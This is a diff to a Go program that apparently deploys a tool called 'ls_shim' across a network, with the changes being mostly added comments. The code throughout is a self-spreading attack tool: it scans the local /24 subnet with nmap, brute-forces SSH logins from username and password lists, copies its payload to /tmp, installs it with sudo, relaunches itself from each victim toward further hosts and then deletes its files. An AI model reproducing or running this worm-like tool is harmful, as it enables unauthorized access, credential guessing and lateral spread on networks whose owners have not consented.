@@ -1,3 +1,5 @@
+// Michael Burke
+
 package main
 
 import (
@@ -25,6 +27,7 @@ var ignoreIPs []string
 var wg sync.WaitGroup
 
 func main() {
+	//Handle arguments
 	args := os.Args
 	if !handleArgs(args) {
 		return
@@ -37,16 +40,20 @@ func main() {
 		fmt.Println("Dependencies installed")
 	}
 	if isTarget && !isDemo {
+		//Transfer files to target machine for deployment
 		transferFilesRunner([]string{targetIP})
 	} else {
+		//Find all IPs on subnet 0/24
 		ips := findIPs()
 		fmt.Print("IP list: ")
 		fmt.Println(ips)
 		if !isDemo {
+			//Transfer files to all devices on network
 			transferFilesRunner(ips)
 		}
 	}
 
+	//Print final output
 	if isVerbose && !isDemo {
 		fmt.Println("Installed on the following IPs:")
 		for i := 0; i < len(installedIPs); i++ {
@@ -60,7 +67,7 @@ func main() {
 
 func runRemote(username, password, ip string) {
 	if isVerbose {
-		fmt.Println("Running exploit on remote system: " + username + "@" + ip)
+		fmt.Print("Running exploit on remote system: " + username + "@" + ip)
 	} else {
 		fmt.Print("Installing on " + ip)
 		if isThreaded {
@@ -69,25 +76,31 @@ func runRemote(username, password, ip string) {
 			fmt.Println()
 		}
 	}
+	//Use sshpass to connect to host without having to input a password
 	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
 	buffer := bytes.Buffer{}
+	//Commands used to deploy exploit on remote system
 	command := "cd /tmp/ls_shim/\n" +
 		"echo " + password + " | sudo -S chmod +x deploy/dependencies.sh\n" +
 		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
 		"echo " + password + " | sudo -S chmod +x install.sh\n" +
 		"echo " + password + " | sudo -S ./install.sh\n"
 	if isTarget {
+		//If this is a target, add commands to deploy to other devices
 		command += "cd deploy\n" +
 			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
 	}
 	command += "echo " + password + " | sudo -S rm -rf /tmp/ls_shim\n"
+	//Write command to buffer
 	buffer.Write([]byte(command))
 	cmd.Stdin = &buffer
 	if isVerbose {
+		//Command output here is extremely crowded if using multithreading;
+		//for that reason, multithreading and verbose can't be used together.
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 	}
-
+	//Run commands on remote system
 	err := cmd.Run()
 	if err != nil {
 		if isVerbose {
@@ -103,11 +116,14 @@ func runRemote(username, password, ip string) {
 }
 
 func sshUp(ip string) bool {
+	//Run a simple nmap scan to see if ssh is up on the target IP
 	cmd := exec.Command("nmap", ip, "-p", "22", "-oG", ".nmapscan-"+ip)
 	cmd.Run()
+	//Read the file and parse the output
 	res := strings.Split(readFile(".nmapscan-"+ip), "\n")
 	os.Remove(".nmapscan-" + ip)
 	for i := 0; i < len(res); i++ {
+		//If port 22 is open, return true
 		if strings.Index(res[i], "Ports: 22") != -1 {
 			str := res[i][strings.Index(res[i], "/")+1:]
 			str = str[:strings.Index(str, "/")]
@@ -120,23 +136,29 @@ func sshUp(ip string) bool {
 }
 
 func transferFilesRunner(ips []string) {
+	//Runner for transferFiles; this is its own separate function
+	//in order to make multithreading easier.
+
+	//Cycle through the list of IPs
 	for i := 0; i < len(ips); i++ {
 		if isVerbose {
 			fmt.Println("Scanning port 22 on " + ips[i])
 		}
+		//Make sure SSH is enabled on port 22 for the target IP
 		if sshUp(ips[i]) {
 			if isThreaded {
+				//If multithreading is enabled, run transferFiles as a gorouting
 				fmt.Println("Checking users on " + ips[i] + " (DETACHED)")
 				wg.Add(1)
 				go transferFiles(ips[i])
 			} else {
 				transferFiles(ips[i])
 			}
-
 		} else {
 			fmt.Println("Host " + ips[i] + " does not have SSH enabled. Skipping...")
 		}
 	}
+	//Wait for deployment to finish on all devices
 	if isThreaded {
 		wg.Wait()
 	}
@@ -148,6 +170,7 @@ func transferFiles(ip string) {
 		fmt.Println("Transferring files to " + ip)
 	}
 	complete := false
+	//Check all possible username+password combinations until one succeeds
 	for u := 0; u < len(usernames); u++ {
 		if isVerbose {
 			fmt.Println("Trying user " + usernames[u])
@@ -158,12 +181,14 @@ func transferFiles(ip string) {
 				command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ip + ":/tmp/"}
 				fmt.Println(command)
 			}
+			//Use SCP to transfer the files, since we know SSH is enabled.
 			cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ip+":/tmp/")
 			err := cmd.Run()
 			if err == nil {
 				if isVerbose {
 					fmt.Println("Files sent")
 				}
+				//After file transfer has succeeded, run commands on remote system to install
 				runRemote(usernames[u], passwords[p], ip)
 				complete = true
 				break
@@ -186,18 +211,23 @@ func transferFiles(ip string) {
 }
 
 func findIPs() []string {
+	//Find all valid IPs on the 0/24 subnet
 	var ipList []string
 	localIp := GetOutboundIP()
 	if isVerbose {
 		fmt.Println("Local IP is " + localIp)
 	}
+	//Get the 0/24 subnet
+	//TODO: add option to specify subnet?
 	ipRange := getPrefix(localIp) + ".0/24"
 	fmt.Println(ipRange)
+	//Ping scan every IP in the subnet and store which ones repond in greppable format
 	cmd := exec.Command("nmap", "-sn", ipRange, "-oG", ".ipscan_lsshim")
 	cmd.Run()
 	ipStr := readFile(".ipscan_lsshim")
 	os.Remove(".ipscan_lsshim")
 	ipArr := strings.Split(ipStr, "\n")
+	//Go through the file and store every valid target IP
 	for i := 0; i < len(ipArr); i++ {
 		if strings.Index(ipArr[i], "Host: ") != -1 {
 			ip := ipArr[i][strings.Index(ipArr[i], "Host: ")+6 : strings.Index(ipArr[i], " (")]
@@ -228,12 +258,15 @@ func getPrefix(ip string) string {
 func getOS(isFail ...bool) string {
 	var ret_os string
 	checkID := false
+	//Nifty little code to let us call getOS with or without a parameter
 	if len(isFail) > 0 && isFail[0] {
 		checkID = true
 	}
+	//Read /etc/os-release to find what distro the host is running on
 	os_str := readFile("/etc/os-release")
 	os_split := strings.Split(os_str, "\n")
 	for i := 0; i < len(os_split); i++ {
+		//Child distros will have ID_LIKE instead of ID. Check for both
 		matchString := "ID_LIKE="
 		if checkID {
 			matchString = "ID="
@@ -245,15 +278,18 @@ func getOS(isFail ...bool) string {
 		}
 	}
 	if ret_os == "" && !checkID {
+		// If ID_LIKE wasn't found, then seach for ID= instead
 		return getOS(true)
 	}
 	return ret_os
 }
 
 func handleArgs(args []string) bool {
+	//Variables for whether usernames & passwords are lists or not
 	var pIsList, uIsList, uIsSingle, pIsSingle bool
 	if len(args) > 1 {
 		for i := 1; i < len(args); i++ {
+			//TODO: Add checking for if args[i+1] exists
 			if args[i] == "--demo" {
 				isDemo = true
 			} else if args[i] == "-u" {
@@ -328,6 +364,8 @@ func handleArgs(args []string) bool {
 		}
 	}
 	if isDemo || ((pIsList || pIsSingle) && (uIsList || uIsSingle)) {
+		//If this is a demo OR if at least one password & username
+		//were provided, arguments are valid
 		return true
 	}
 	if !(uIsList || uIsSingle) {
@@ -343,6 +381,9 @@ func handleArgs(args []string) bool {
 }
 
 func installDependencies() {
+	//We need to install both sshpass and nmap,
+	//nmap for scanning ports and sshpass
+	//for using ssh with a plaintext password
 	if systemOS == "debian" {
 		cmd := exec.Command("apt-get", "install", "sshpass", "-y")
 		cmd.Run()
@@ -354,6 +395,8 @@ func installDependencies() {
 		cmd = exec.Command("pacman", "-S", "nmap", "--noconfirm")
 		cmd.Run()
 	} else if strings.Index(systemOS, "rhel") != -1 {
+		//sshpass doesn't have a repo on centOS as far as I can tell, so
+		//we need to install it from a rpm package instead
 		cmd := exec.Command("curl", "http://mirror.centos.org/centos/7/extras/x86_64/Packages/sshpass-1.06-2.el7.x86_64.rpm", "-o", "sshpass.rpm")
 		cmd.Run()
 		cmd = exec.Command("yum", "localinstall", "sshpass.rpm", "-y")
@@ -370,12 +413,6 @@ func installDependencies() {
 	}
 }
 
-func runCommand(binary, args string) {
-	cmd := exec.Command(binary, args)
-	err := cmd.Run()
-	fmt.Println(err)
-}
-
 func readFile(path string) string {
 	dat, _ := ioutil.ReadFile(path)
 	str := string(dat)
@@ -383,6 +420,7 @@ func readFile(path string) string {
 }
 
 func contains(s []string, str string) bool {
+	//Golang doesn't have a built-in function for contains
 	for _, v := range s {
 		if v == str {
 			return true
@@ -393,6 +431,9 @@ func contains(s []string, str string) bool {
 }
 
 func GetOutboundIP() string {
+	//Dial a connection to a WAN IP to get the box's correct IP address.
+	//Note that this doesn't actually establish a connection,
+	//but simply pretends to setup one. This is enough to get us the IP
 	conn, err := net.Dial("udp", "8.8.8.8:80")
 	if err != nil {
 		log.Fatal(err)
